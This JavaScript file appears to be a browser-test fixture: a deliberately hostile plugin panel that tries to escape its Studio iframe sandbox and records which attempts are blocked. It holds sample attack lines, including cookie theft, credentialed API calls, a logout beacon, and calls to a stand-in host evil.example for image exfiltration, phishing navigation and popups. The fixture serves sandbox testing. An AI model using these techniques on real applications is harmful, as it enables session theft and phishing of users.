/* global window, document, navigator, fetch, XMLHttpRequest, WebSocket, EventSource, Image, self, indexedDB, setTimeout */
// The browser half of the hostile fixture: a panel that tries to get at the
// Studio it is embedded in. Each attempt records whether it got through; the
// browser test reads the report from outside the frame.
import { connectPanel } from './@studio/panel.js';

const report = {};
const attempt = async (name, action) => {
  try {
    report[name] = { ok: true, value: await action() };
  } catch (error) {
    report[name] = { ok: false, error: `${error?.name ?? 'Error'}: ${String(error?.message ?? error).slice(0, 120)}` };
  }
};
const loads = (url) =>
  new Promise((resolve, reject) => {
    const image = new Image();
    image.onload = () => resolve('loaded');
    image.onerror = () => reject(new Error('blocked'));
    image.src = url;
  });
const settles = (create) =>
  new Promise((resolve, reject) => {
    const target = create();
    target.onopen = () => resolve('opened');
    target.onerror = () => reject(new Error('blocked'));
    setTimeout(() => reject(new Error('never opened')), 1500);
  });

const studio = window.location.origin;

report.scriptRan = { ok: true, value: true };
report.origin = { ok: true, value: { self: self.origin, location: studio } };
report.inlineScriptRan = { ok: document.getElementById('report').dataset.inline === 'ran' };

// The user's session and the Studio's stored state.
await attempt('cookie', () => document.cookie);
await attempt('setCookie', () => ((document.cookie = 'planted=1; path=/'), document.cookie));
await attempt('localStorage', () => window.localStorage.length);
await attempt('sessionStorage', () => window.sessionStorage.length);
await attempt('indexedDB', () => new Promise((resolve, reject) => {
  const open = indexedDB.open('studio');
  open.onsuccess = () => resolve('opened');
  open.onerror = () => reject(open.error ?? new Error('blocked'));
}));
await attempt('serviceWorker', () => navigator.serviceWorker.register('./attack.js'));

// The Studio's API, as the user.
await attempt('fetch /api/auth/state', async () => (await fetch('/api/auth/state')).status);
await attempt('fetch with credentials', async () => (await fetch(`${studio}/api/plugins`, { credentials: 'include' })).status);
await attempt('fetch no-cors', async () => (await fetch(`${studio}/api/auth/state`, { mode: 'no-cors', credentials: 'include' })).type);
await attempt('fetch own asset', async () => (await fetch('./attack.css')).status);
await attempt('xhr', () => new Promise((resolve, reject) => {
  const request = new XMLHttpRequest();
  request.open('GET', '/api/auth/state');
  request.onload = () => resolve(request.status);
  request.onerror = () => reject(new Error('blocked'));
  request.send();
}));
await attempt('websocket', () => settles(() => new WebSocket(`${studio.replace('http', 'ws')}/api/realtime`)));
await attempt('eventsource', () => settles(() => new EventSource('/api/realtime')));
await attempt('beacon', () => {
  if (!navigator.sendBeacon('/api/auth/logout', 'x')) throw new Error('refused');
  return 'queued';
});

// Anything outside its own folder — the Studio or the world — even as an image.
await attempt('image from the Studio', () => loads('/api/health?leak=from-image'));
await attempt('image from elsewhere', () => loads('https://evil.example/collect.png?stolen=1'));
await attempt('image from own folder', () => loads('./pixel.svg'));
await attempt('script from the Studio', () => import(`${studio}/api/health`));
await attempt('eval', () => (0, eval)('1 + 1'));
await attempt('new Function', () => new Function('return 1 + 1')());

// The page around it.
await attempt('parent document', () => window.parent.document.title);
await attempt('parent storage', () => window.parent.localStorage.length);
await attempt('top location read', () => window.top.location.href);
await attempt('top navigation', () => {
  window.top.location = 'https://evil.example/phish';
  return 'navigated';
});
await attempt('popup', () => {
  const opened = window.open('https://evil.example/popup');
  if (!opened) throw new Error('blocked');
  return 'opened';
});
await attempt('form post', () => {
  document.getElementById('form').submit();
  return 'submitted';
});

// The one thing it is meant to be able to do.
await attempt('panel call', async () => {
  const connection = await connectPanel({ timeoutMs: 5000 });
  const answer = await connection.request('echo', { greeting: 'from the hostile panel' });
  return { context: connection.context, answer };
});

const output = document.getElementById('report');
output.textContent = JSON.stringify(report);
output.dataset.done = 'true';
